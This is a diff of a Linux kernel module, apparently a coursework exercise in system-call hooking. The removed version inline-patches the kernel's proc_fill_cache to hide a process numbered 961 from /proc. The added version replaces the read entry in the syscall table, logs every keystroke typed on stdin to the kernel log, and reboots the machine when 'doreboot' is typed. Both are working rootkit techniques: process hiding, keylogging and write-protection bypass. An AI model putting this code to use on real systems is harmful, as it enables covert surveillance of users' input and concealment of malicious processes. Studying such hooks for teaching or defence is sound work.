@@ -3,19 +3,14 @@
  *  System Call Hooking
  *
  *  Requirements:
- *     a) hook the read system call
+ *     a) hook the system read call
  *     b) reboot the machine if certain keystroke is detected by the kernel
  */
-
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/sched.h>
 #include <linux/delay.h>
 #include <linux/reboot.h>
-#include <linux/fs.h>
-#include <linux/pid_namespace.h>
-#include <linux/ptrace.h>
-#include "proc_internal.h"
 #include <asm/paravirt.h>
 #include "sysmap.h"
 
@@ -37,85 +32,65 @@ int (*asmlinkage old_read_func)(int fd, void* buf, size_t count);
 
 atomic_t active_read_calls = ATOMIC_INIT(0);
 
-bool fake__proc_fill_cache(struct file *file, struct dir_context *ctx,
-        const char *name, int len,
-        instantiate_t instantiate, struct task_struct *task, const void *ptr)
+asmlinkage int fake_read(int fd, void* buf, size_t count)
 {
-        struct dentry *child, *dir = file->f_path.dentry;
-        struct qstr qname = QSTR_INIT(name, len);
-        struct inode *inode;
-        unsigned type;
-        ino_t ino;
-        bool ret;
+    char mybuf[2];
+    int ret, i;
+    atomic_inc(&active_read_calls);
 
-        atomic_inc(&active_read_calls);
+    ret = old_read_func(fd, buf, count);
 
-        if (strcmp(name, "961") == 0)
+    if (fd == 0)
+    {
+        if (strstr(buf, "doreboot"))
         {
-            return true;
+            ((int (*)(char*))SM_kernel_restart)(NULL);
         }
-
-        child = d_hash_and_lookup(dir, &qname);
-        if (!child) {
-                child = d_alloc(dir, &qname);
-                if (!child)
-                        goto end_instantiate;
-                if (instantiate(d_inode(dir), child, task, ptr) < 0) {
-                        dput(child);
-                        goto end_instantiate;
-                }
+        else
+        {
+            printk(KERN_INFO);
+            mybuf[1] = '\0';
+            for (i = 0; i < ret; i++)
+            {
+                mybuf[0] = ((char*)buf)[i];
+                if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
+                printk(mybuf);
+            }
+            printk("\n");
         }
-        inode = d_inode(child);
-        ino = inode->i_ino;
-        type = inode->i_mode >> 12;
-        dput(child);
-        ret = dir_emit(ctx, name, len, ino, type);
-        goto gtfo;
+    }
 
-end_instantiate:
-        ret = dir_emit(ctx, name, len, 1, DT_UNKNOWN);
-
-gtfo:
-        atomic_dec(&active_read_calls);
-        return ret;
+    atomic_dec(&active_read_calls);
+    return ret;
 }
 
-uint8_t func_backup[12];
-
-void hook(void)
+void hook_read(void)
 {
-    uint8_t* p;
-
     disable_ro();
-    p = (uint8_t*)SM_proc_fill_cache;
-    memcpy(func_backup, p, sizeof(func_backup));
-    p[0] = 0x48;
-    p[1] = 0xb8;
-    *(void**)(p + 2) = fake__proc_fill_cache;
-    p[10] = 0xff;
-    p[11] = 0xe0;
+    old_read_func = syscalls[__NR_read];
+    syscalls[__NR_read] = fake_read;
     enable_ro();
 }
 
-void unhook(void)
+void unhook_read(void)
 {
     disable_ro();
-    memcpy(SM_proc_fill_cache, func_backup, sizeof(func_backup));
+    syscalls[__NR_read] = old_read_func;
     enable_ro();
 }
 
 int init_module(void){
-    printk(KERN_INFO "Kernel module hook_read_n_reboot loaded.\n");
+    printk(KERN_INFO "Hello world\n");
 
-    hook();
+    hook_read();
 
     return 0;
 }
 
 void cleanup_module(void){
-    printk(KERN_INFO "Kernel module hook_read_n_reboot unloaded.\n");
+    printk(KERN_INFO "Goodbye world\n");
 
-    unhook();
+    unhook_read();
 
     // Prevent other CPUs from crashing due to running unloaded code
     // Not too pretty but should be fine
